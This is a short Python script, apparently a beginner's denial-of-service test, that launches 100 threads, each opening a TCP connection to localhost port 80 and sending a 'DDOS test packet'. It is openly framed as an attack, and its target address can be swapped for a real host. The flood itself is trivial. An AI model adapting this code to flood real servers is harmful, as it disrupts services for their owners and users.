```python
import socket
import threading

def attack(target_ip, target_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((target_ip, target_port))
        client.send(b"Faizan DDOS test packet\n")
        client.close()
    except:
        pass

target_ip = "127.0.0.1"  # Only for local testing
target_port = 80

print(f"Starting attack on {target_ip}:{target_port}")

for i in range(100):  # 100 threads
    thread = threading.Thread(target=attack, args=(target_ip, target_port))
    thread.start()
